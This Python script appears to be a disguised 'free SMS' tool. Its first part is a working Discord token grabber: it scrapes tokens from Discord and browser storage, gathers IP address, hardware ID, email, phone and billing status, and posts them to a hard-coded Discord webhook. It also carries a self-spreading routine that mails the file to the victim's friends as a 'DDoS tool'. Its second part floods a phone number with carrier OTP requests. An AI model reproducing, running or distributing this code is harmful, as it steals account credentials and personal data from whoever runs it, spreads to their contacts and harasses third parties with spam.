import os

if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv

WEBHOOK_URL = "https://discord.com/api/webhooks/896330710741319701/lvupIlDv1s8pANbZMtHxzQfpU0FkwCN6EgmG40kE-brY9FiIC0FVvsby7slk8MqiaxhK" # Insert webhook url here

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}


def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass


def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass


def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass


def spread(token, form_data, delay):
    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)


def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"Visit my website for more Cybersecurity contents: un5t48l3.com"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
    }
    try:
        
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()


try:
    main()
except Exception as e:
    print(e)
    pass
import requests,json,time,threading
import socket, socks, threading, random, re, os
import sys, glob, requests, webbrowser
def logo():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color ' +random.choice(['f'])+ " & cls & title FREESMS BY : ชอบหี")
        
print('''
          
█████████████████████████████████████████████████████████████████████████████████████████████████████████████
█─▄─▄─█─█─██▀▄─██▄─▀█▄─▄█▄─█─▄███▄─▄▄─█─▄▄─█▄─▄▄▀███▄─█─▄█─▄▄─█▄─██─▄█▄─▄▄▀███─▄─▄─█─▄▄─█▄─█─▄█▄─▄▄─█▄─▀█▄─▄█
███─███─▄─██─▀─███─█▄▀─███─▄▀█████─▄███─██─██─▄─▄████▄─▄██─██─██─██─███─▄─▄█████─███─██─██─▄▀███─▄█▀██─█▄▀─██
▀▀▄▄▄▀▀▄▀▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▀▄▄▀▀▀▄▄▄▀▀▀▄▄▄▄▀▄▄▀▄▄▀▀▀▀▄▄▄▀▀▄▄▄▄▀▀▄▄▄▄▀▀▄▄▀▄▄▀▀▀▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀   

                [ >SMS BY | โดนดักเเล้วไอควาย < ]
-----------------------------------------------------------------------          
                [ > Example : 669123456789 < ]
                                    ''')
session = requests.Session()
number = input("Phone Number 66+ : ")
num = int("" + number)
class SMS():        

    def spamais(self,number):
        url = "https://srfng.ais.co.th/login/sendOneTimePW"
        data = f"msisdn={num}&serviceId=AISPlay&accountType=all&otpChannel=sms"
        headers = {
                    "Host": "srfng.ais.co.th",
                    "Connection": "keep-alive",
                    "Content-Length": "67",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://srfng.ais.co.th",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty", 
                    "Referer": "https://srfng.ais.co.th/8WXNShEVNCGn0o3%2BN6pPqiW5KfoLSNBvVqkqoQCl%2Bc4%3D?channel=webview&redirectURL=http%3A%2F%2Fakdev.vidnt.com&httpGenerate=generated",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Cookie": "_chunk=1; ol3-0=po2YOaPtZc%252BHZHeVG7D7ZG%252BLV3UUNnejYANfRIc2aJod7cBWn4witm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545pslib3M%252FI2DYESmolC484IfK0uXD5D0rC%252Fo5%252FO%252BMvAmKevq9L6vW8pFbvG%252B5q%252BBInKvYPJ%252BOxCyzMixWbOUnOW4axJtZp3grN474ew9v4UFkdU8VUGoXKVhldzaK9%252BxYuJBdY2Jfzqf%252FsVIYv3uE4RmGzzoeCrQ7QXZm0uH6t3j1yF63KOQX4QwOmpG526ym0Sh%252BXLWQFhxnbuquuA8N7cumFvTTi7oWHt4W8mJQ4IN1GvS0iHlBQHgvnEkjGRlCtB%252FJ07aNkfBWlLrwb1zgQI88OkOrtTDDUdsIUSVdy7r5pOILz6rcT8kC%252FGqneTshPK9RF4PHxrBSDIPlQIVXJI6dxsiAr5H3UfAAa5FsfN8samV5qyQTgm3s9SC4w83uM1twiFJtarImPcx41vDFL7NF4yy7Ej7eSY%252FFyqLQuoCKDPhxlyOaH8mRoseOkpdQI0Bp4z75t0NlP%252B4YIV4EKmRueIktZmOk5c0I1SLC3bZ240Wshg7rbP6IgtwFEzWrOoIAGpfWHDjYjI8oiMpQX98aBtbtZA9sKvIDrY%252FdQqDsP4vDSPy3n1zb8pXhqaKLkDaAWih%252Ba6BX3FkEdn4fPrzZrNPfuHRC3hfSV51Jz4t3RxTPUlOS8goU8VSmQF%252F9wQEaLAkVR3F4sGzn1GH1fesp46wBbSOSkWNCEIu%252F%252B1VTElnOqnPSntHsUmow7jMst3uCb7Z9mNj%252Bo4RQM0oEuf39FLtPgIWMfYBXSEQXOXUeO2%252BYXI9OUFORSQBJy1kZcTPw2gjR4ZYrkaWKgqCo5jtIclLeDiLqzdBKYjupRC3%252BFXgL0SDchuE%252BD3XaNJ1YH2SVg0UzxbOIg6aIBxcIhakpSZw2w0jjPL1c1YG%252BAgVvT%252BeNL%252FzHr%252FeiqQkFjNI%252F64fvurU75Qy53GSlOBBvQTMhg0q11qYi4QMaxf2V%252FQ1TY3QLnfXiYKCq60Gh9gSACyjrf8thXVYUYheRWz2jM%252BotOvz%252FZwIbXf4SPGR71PK7X%252F2a30w01XgOvYf9dxC%252F9pWn4yNxgl%252BPhoIXK%252Fj%252FQRofkDIdzr1VJ0%252Bq6aX66IuSuytQAwWsoB"
        }
        time.sleep(1)
        send = session.post(url,data=data,headers=headers).json()
t = SMS()
def loop(num):
    for i in range(num):
        t.spamais(num)
        print("[ >SMS BY โดนดักเเล้วไอ้ควาย < ]")
loop(num)